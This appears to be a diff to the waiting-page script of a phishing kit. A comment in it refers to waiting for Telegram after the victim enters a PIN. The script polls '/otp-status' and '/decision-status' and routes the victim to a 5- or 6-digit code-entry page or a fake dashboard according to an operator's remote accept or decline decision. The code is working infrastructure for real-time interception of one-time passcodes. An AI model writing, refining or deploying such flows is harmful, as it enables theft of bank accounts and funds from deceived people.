@@ -28,68 +28,59 @@
 
 <script>
 
-// FLOW A: STEP4 → STEP5 (5 seconds delay)
+// 🔵 FLOW 1: from earlier step → go to step5 after 5s
 if (localStorage.getItem("firstProcess") === "yes") {
-
     localStorage.removeItem("firstProcess");
 
     setTimeout(() => {
         window.location.href = "step5.html";
-    }, 5000); // ✅ fixed to 5 seconds
+    }, 5000);
 }
 
-
-// ===== FLOW B: AFTER PIN → WAIT FOR TELEGRAM =====
-if (true) {
-
-  const checker = setInterval(async () => {
+// 🔵 FLOW 2: always check for updates (OTP + decision)
+const checker = setInterval(async () => {
     try {
+        // 🔢 CHECK OTP TYPE (5 or 6)
         const res = await fetch("/otp-status");
         const data = await res.json();
 
-        console.log("OTP STATUS:", data);
+        if (data.otp === 5) {
+            clearInterval(checker);
+            localStorage.setItem("otpLength", 5);
+            window.location.href = "verification.html";
+            return;
+        }
 
-        // 🔥 go to step5 if needed
-       
-    if (data.otp == 5) {
-    clearInterval(checker);
+        if (data.otp === 6) {
+            clearInterval(checker);
+            localStorage.setItem("otpLength", 6);
+            window.location.href = "verification.html";
+            return;
+        }
 
-    // ✅ save length
-    localStorage.setItem("otpLength", 5);
-
-    window.location.href = "verification.html";
-}
-
-if (data.otp == 6) {
-    clearInterval(checker);
-
-    // ✅ save length
-    localStorage.setItem("otpLength", 6);
-
-    window.location.href = "verification.html";
-}
-
+        // ✅ CHECK APPROVE / DECLINE
         const decisionRes = await fetch("/decision-status");
         const decisionData = await decisionRes.json();
 
         if (decisionData.decision === "accept") {
             clearInterval(checker);
             window.location.href = "dashboard.html";
+            return;
         }
 
         if (decisionData.decision === "decline") {
             clearInterval(checker);
             localStorage.clear();
             window.location.href = "step5.html";
+            return;
         }
 
     } catch (err) {
         console.log("Waiting...");
     }
-  }, 2000);
-
-}
+}, 2000);
 
 </script>
+
 </body>
 </html>
